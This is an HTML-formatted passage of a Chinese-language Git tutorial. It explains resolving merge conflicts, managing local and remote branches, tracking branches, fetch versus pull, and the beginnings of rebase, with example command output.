&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git merge iss53

Auto-merging index.html

CONFLICT &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;content&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Merge conflict &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;index.html

Automatic merge failed&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; fix conflicts and &lt;span class=&quot;k&quot;&gt;then &lt;/span&gt;commit the result.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;检查 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git status&lt;/code&gt; 时会显示如下：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git status

On branch master

You have unmerged paths.

  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fix conflicts and run &lt;span class=&quot;s2&quot;&gt;&quot;git commit&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;



Unmerged paths:

  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s2&quot;&gt;&quot;git add &amp;lt;file&amp;gt;...&quot;&lt;/span&gt; to mark resolution&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;



    both modified:      index.html



no changes added to commit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s2&quot;&gt;&quot;git add&quot;&lt;/span&gt; and/or &lt;span class=&quot;s2&quot;&gt;&quot;git commit -a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;出现冲突的文件会包含一些特殊区段，类似：&lt;/p&gt;
&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;HEAD:index.html&lt;/span&gt;

&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;footer&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;contact : email.support@github.com&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;

=======

&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;footer&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;

please contact us at support@github.com

&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;

&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt; iss53:index.html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这表示 HEAD所指示的版本在这个区域的上半部分（======的上半部分），而 iss53 分支所指示的版本在======的下班部分。你必须选择其中那个一个，或者你也可以自行合并这些内容，比如将该部分替换为下面内容来解决冲突：&lt;/p&gt;
&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;footer&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;

please contact us at email.support@github.com

&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;也可以使用图形化的工具来解决冲突，比如运行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git mergetool&lt;/code&gt; 启动一个合适的图形化工具：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git mergetool
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;等待退出图形化工具之后，Git 会讯问是否合并成功。如果回答是，Git 会暂存文件表明冲突已解决。可以运行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git status&lt;/code&gt; 来确认所有的合并冲突都已被解决：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git status

On branch master

All conflicts fixed but you are still merging.

  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s2&quot;&gt;&quot;git commit&quot;&lt;/span&gt; to conclude merge&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;



Changes to be committed:



    modified:   index.html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;如果结果正确，并且之前有冲突的文件都已暂存，就可以使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git commit&lt;/code&gt; 来提交合并了。&lt;/p&gt;

&lt;h2 id=&quot;分支管理&quot;&gt;分支管理&lt;/h2&gt;
&lt;p&gt;运行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git branch&lt;/code&gt; 获得当前所有分支的列表：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git branch
  iss53
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; master
  testing
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;注意 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;master&lt;/code&gt; 分支前的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*&lt;/code&gt; 字符，它代表现在检出的那个分支（也就是当前 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HEAD&lt;/code&gt; 指针所指向的分支）。&lt;/p&gt;

&lt;p&gt;运行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git branch -v&lt;/code&gt; 查看每个分支的最后一次提交：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git branch &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;

  iss53   93b412c fix javascript issue

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; master  7a98805 Merge branch &lt;span class=&quot;s1&quot;&gt;'iss53'&lt;/span&gt;

  testing 782fd34 add scott to the author list &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the readmes
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;使用带有 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--merged&lt;/code&gt; 和 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--no-merged&lt;/code&gt; 选项来过滤已经合并或尚未合并的分支：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git branch &lt;span class=&quot;nt&quot;&gt;--merged&lt;/span&gt;

  iss53

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; master
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git branch -d&lt;/code&gt; 删除未合并的分支会提示失败：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git branch &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; testing

error: The branch &lt;span class=&quot;s1&quot;&gt;'testing'&lt;/span&gt; is not fully merged.

If you are sure you want to delete it, run &lt;span class=&quot;s1&quot;&gt;'git branch -D testing'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;如果确实需要删除分支，可以使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-D&lt;/code&gt; 选项强制删除。&lt;/p&gt;

&lt;h2 id=&quot;远程分支&quot;&gt;远程分支&lt;/h2&gt;
&lt;p&gt;远程引用是对远程仓库的引用（指针），包括分支、标签等等。可以通过 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git ls-remote&lt;/code&gt; 来显式的获取远程引用的完整版本，或者通过 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git remote show&lt;/code&gt; 获得远程分支的更多信息。&lt;/p&gt;

&lt;p&gt;远程分支以(remote)/(branch)形式命名。例如查看最后一次与远程仓库 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;origin&lt;/code&gt; 通信时 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;master&lt;/code&gt; 分支的状态，可以查看 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;origin/master&lt;/code&gt; 分支。&lt;/p&gt;

&lt;p&gt;如果有一个 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git.ourcompany.com&lt;/code&gt; 的 Git 服务器，从这里克隆一个项目，Git 的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clone&lt;/code&gt; 命令会将其自动名 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;origin&lt;/code&gt;，拉取它的所有数据，创建一个指向它的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;master&lt;/code&gt; 分支的指针，并且在本地将其命名为 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;origin/master&lt;/code&gt;。Git 也会创建一个与 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;origin&lt;/code&gt; 的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;master&lt;/code&gt; 分支指向同一个地方的本地 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;master&lt;/code&gt; 分支，这样就可以在此基础上工作了。&lt;/p&gt;

&lt;p&gt;如果此时你在本地 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;master&lt;/code&gt; 分支做了一定修改，同一时间其他人推送提交到远程 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;master&lt;/code&gt; 分支，那么只要你不和 origin 服务器连接，本地的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;origin/master&lt;/code&gt; 指针就不会移动。&lt;/p&gt;

&lt;p&gt;如果需要同步，运行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git fetch origin&lt;/code&gt; 命令。这个命令从 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;origin&lt;/code&gt; 服务器抓取本地没有的数据，并且更新本地数据库，移动 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;origin/master&lt;/code&gt; 指针指向新的、更新后的位置。&lt;/p&gt;

&lt;h3 id=&quot;推送&quot;&gt;推送&lt;/h3&gt;
&lt;p&gt;当需要将本地分支推送到远程仓库时，必须显式的推送想要分享的分支。&lt;/p&gt;

&lt;p&gt;如果希望推送 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;serverfix&lt;/code&gt; 分支，运行命令：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git push origin serverfix

Counting objects: 24, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

Delta compression using up to 8 threads.

Compressing objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;15/15&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

Writing objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;24/24&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 1.91 KiB | 0 bytes/s, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

Total 24 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, reused 0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

To https://github.com/schacon/simplegit

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;new branch]      serverfix -&amp;gt; serverfix
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Git 自动将 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;serverfix&lt;/code&gt; 分支名字展开为 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;refs/heads/serverfix:refs/heads/serverfix&lt;/code&gt;，上面命令就意味着：推送本地的 serverfix 分支来更新远程的 serverfix 分支。如果需要为远程仓库上的分支使用不同的名称，可以运行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git push origin serverfix:awesomebranch&lt;/code&gt; 来将本地的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;serverfix&lt;/code&gt; 分支推送到远程仓库上的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;awesomebranch&lt;/code&gt; 分支。&lt;/p&gt;

&lt;p&gt;下一次其他协作者从服务器上抓取数据时，会在本地生成一个远程分支 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;origin/serverfix&lt;/code&gt;，指向服务器的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;serverfix&lt;/code&gt; 分支的引用：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git fetch origin

remote: Counting objects: 7, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

remote: Compressing objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2/2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

remote: Total 3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, reused 3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Unpacking objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3/3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

From https://github.com/schacon/simplegit

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;new branch]      serverfix    -&amp;gt; origin/serverfix
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;当抓取到新的远程跟踪分支时，本地不会自动生成一份可编辑的副本。如果想要在自己的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;serverfix&lt;/code&gt; 分支上工作，可以将其简历在远程跟踪分支上：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; serverfix origin/serverfix

Branch serverfix &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;up to track remote branch serverfix from origin.

Switched to a new branch &lt;span class=&quot;s1&quot;&gt;'serverfix'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;跟踪分支&quot;&gt;跟踪分支&lt;/h3&gt;
&lt;p&gt;从一个远程跟踪分支检出一个本地分支会自动创建一个叫做“跟踪分支”。跟踪分支是与远程分支有直接关系的本地分支。如果在一个跟踪分支上执行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git pull&lt;/code&gt;，Git 能自动识别去哪个服务器抓取数据、合并到哪个分支。&lt;/p&gt;

&lt;p&gt;当使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git clone&lt;/code&gt; 克隆一个仓库时，它通常会自动创建一个跟踪 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;origin/master&lt;/code&gt; 的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;master&lt;/code&gt; 分支。可以手动设置其他跟踪分支/或者不跟踪。运行之前提过的命令 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git checkout -b [branch] [remotename]/[branch]&lt;/code&gt; 来跟踪指定的分支，或者使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--track&lt;/code&gt; 快捷方式：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout &lt;span class=&quot;nt&quot;&gt;--track&lt;/span&gt; origin/serverfix

Branch serverfix &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;up to track remote branch serverfix from origin.

Switched to a new branch &lt;span class=&quot;s1&quot;&gt;'serverfix'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;如果需要将本地分支与远程分支设置不同的名字，可以运行：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; sf origin/serverfix

Branch sf &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;up to track remote branch serverfix from origin.

Switched to a new branch &lt;span class=&quot;s1&quot;&gt;'sf'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;此时，本地分支 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sf&lt;/code&gt; 会自动从 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;origin/master&lt;/code&gt; 拉取。&lt;/p&gt;

&lt;p&gt;设置已有的本地分支跟踪一个远程分支，或者修改正在跟踪的上游分支，可以使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-u&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--set-upstream-to&lt;/code&gt; 选项运行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git branch&lt;/code&gt; 来手动指定：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git branch &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; origin/serverfix

Branch serverfix &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;up to track remote branch serverfix from origin.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git branch -vv&lt;/code&gt; 来查看设置的所有跟踪分支，以及更多信息：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git branch &lt;span class=&quot;nt&quot;&gt;-vv&lt;/span&gt;

  iss53     7e424c3 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;origin/iss53: ahead 2] forgot the brackets

  master    1ae2a45 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;origin/master] deploying index fix

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; serverfix f8674d9 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;teamone/server-fix-good: ahead 3, behind 1] this should &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;it

  testing   5ea463a trying something new
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这里看到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iss53&lt;/code&gt; 分支正在跟踪 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;origin/iss53&lt;/code&gt; 并且 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ahead 2&lt;/code&gt; 表示本地有两个提交没有推送到服务器；&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;master&lt;/code&gt; 分支正在跟踪 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;origin/master&lt;/code&gt; 并且是最新的；&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;serverfix&lt;/code&gt; 分支正在跟踪 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;teamone&lt;/code&gt; 服务器上的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server-fix-good&lt;/code&gt; 分支并且有3次修改未提交到服务器，服务器有1次提交没有拉取合并；&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;testing&lt;/code&gt; 分支没有跟踪任何远程分支。&lt;/p&gt;

&lt;p&gt;需要注意的是该命令是本地执行的，显示的是上一次连接服务器时的状态。如果需要最新数据，需要在运行此命令前抓取所有的远程仓库：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git fetch &lt;span class=&quot;nt&quot;&gt;--all&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;git branch &lt;span class=&quot;nt&quot;&gt;-vv&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;拉取&quot;&gt;拉取&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git fetch&lt;/code&gt; 命令只会抓取服务器上的数据，不会修改工作目录中的内容自动合并。另一个命令 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git pull&lt;/code&gt; 大多数情况下的含义是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git fetch&lt;/code&gt; 后面紧接着一个 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git merge&lt;/code&gt; 命令，如果本地分支已经设置好了跟踪分支（不管是手动设置的还是通过 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git clone&lt;/code&gt; 自动设置的），&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git pull&lt;/code&gt; 都会查找当前分支跟踪的服务器分支，从服务器获取最新数据并合并到本地的那个远程分支中。&lt;/p&gt;

&lt;p&gt;由于 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git pull&lt;/code&gt; 自动合并经常让人困惑，所以推荐单独使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fetch&lt;/code&gt; 和 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;merge&lt;/code&gt; 命令手动合并会更好一些。&lt;/p&gt;

&lt;h3 id=&quot;删除远程分支&quot;&gt;删除远程分支&lt;/h3&gt;
&lt;p&gt;通过带有 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--delete&lt;/code&gt; 选项的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git push&lt;/code&gt; 命令来删除远程分支：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git push origin &lt;span class=&quot;nt&quot;&gt;--delete&lt;/span&gt; serverfix

To https://github.com/schacon/simplegit

- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;deleted]         serverfix
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;变基&quot;&gt;变基&lt;/h2&gt;
&lt;p&gt;在 Git 中整合来自不同分支的修改主要有两种方法：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;merge&lt;/code&gt; 和 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rebase&lt;/code&gt;。&lt;/p&gt;

&lt;h3 id=&quot;变基的基本操作&quot;&gt;变基的基本操作&lt;/h3&gt;
&lt;p&gt;整合分支最容易的方法是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;merge&lt;/code&gt; 命令。它会将两个分支最新快照以及两者最近的共同祖先进行三方合并，生成一个新的快照（并提交）。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/5cr1pt/img4markdown/master/pics/20200918202549.jpeg&quot; alt=&quot;F 3-28&quot; /&gt;&lt;/p&gt;

&lt;p&gt;另一种方法：提取在 C4 分支中引入的补丁和修改，然后在 C3 的基础上再应用一次。这种操作叫 #变基#。使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rebase&lt;/code&gt; 命令将提交到某一分支上的所有修改都移至另一分支上，就好像“重新播放”一样。&lt;/p&gt;

&lt;p&gt;这个例子的操作：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout experiment
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git rebase master

First, rewinding &lt;span class=&quot;nb&quot;&gt;head &lt;/span&gt;to replay your work on top of it...

Applying: added staged &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;原理是：首先找到这两个分支（当前分支 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;experiment&lt;/code&gt;、变基操作的目标基底分支 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;master&lt;/code&gt;）的最近共同祖先 C2，然后对比当前分支相对于该祖先的历次提交，提取相应的修改并存为临时文件，然后将当前分支指向目标基底 C3，最后以此将之前另存为临时文件的修改依序应用。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/5cr1pt/img4markdown/master/pics/20200918202605.jpeg&quot; alt=&quot;F 3-29&quot; /&gt;&lt;/p&gt;

&lt;p&gt;现在回到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;master&lt;/code&gt; 分支，进行依次快进合并：&lt;/p&gt;
